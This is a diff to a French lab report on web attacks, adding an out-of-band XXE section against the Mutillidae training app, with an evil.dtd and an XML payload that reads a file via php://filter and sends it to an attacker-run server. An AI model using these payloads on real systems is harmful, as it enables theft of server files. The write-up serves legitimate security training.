@@ -180,6 +180,8 @@ On lance l'attaque !!
 
 #### XXE
 
+##### Attaque en direct
+
 On souhaites exploiter des erreurs de paramétrage dans les parseurs XML.
 Pour se faire on intercepte la requête et on change la partie XML en ce qui suit.
 ```xml
@@ -191,10 +193,6 @@ Pour se faire on intercepte la requête et on change la partie XML en ce qui sui
 ```
   
 On aura en retour: `.dockerenv bin boot dev docker-java-home etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var `.
-
-
-
-
 
 
 Le script suivant permet quant à lui d'exfiltrer ces données en créant une variable ou on stocke les données de secret.txt, puis on affiche cette variable.
@@ -218,7 +216,7 @@ Le script suivant permet quant à lui d'exfiltrer ces données en créant une va
     Sur le site la requête a été exécutée  
     
 
-**Cette attaque peut aussi être réalisée a l'aide d'un fichier**
+##### Attaque a l'aide d'un fichier
 
 On upload le fichier attack.dtd via WebWolf.  
 
@@ -240,9 +238,46 @@ Ici on va cherche le fichier attack.dtd et on viens afficher son contenu
 </comment>
 ```
 
+##### Mulillidae
 
+L'outil du TP: [Mulillidae](http://192.168.0.1/mutillidae/index.php?page=xml-validator.php)  
+On souhaite a présent extraire les données vers un site externe.
 
+evil.dtd (placé ici: `http://127.0.0.1:81/evil.dtd`)
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:81'>"> #Serveur auquel envoyé les logs avec les données volées
+%all;
+```
 
+Script renseigné
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE roottag [
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=robots.txt"> #Localisation du fichier a voler
+<!ENTITY % dtd SYSTEM "http://127.0.0.1:81/evil.dtd"> #Lien ou stocker le .dtd
+%dtd;
+]>
+<company>
+  <employee>
+    <firstname>Jo</firstname>
+    <lastname>Black</lastname>
+  </employee>
+  <employee>
+    <firstname>John</firstname>
+    <lastname>Doe</lastname>
+  </employee> 
+  <employee>
+    <firstname>&send;Bob</firstname>
+    <lastname>Smith</lastname>
+  </employee>
+</company>
+```
+
+!!! Explications
+    On demande via le XML renseigner de stocker robots.txt (encodé) et de stocké dans file  
+    Puis de charger notre script evil.dtd sur un server externe  
+    Le script evil demande d'envoyé "un log" sur notre serveur local avec les infos du fichier volé  
 
 
 ### Access Control Flaws
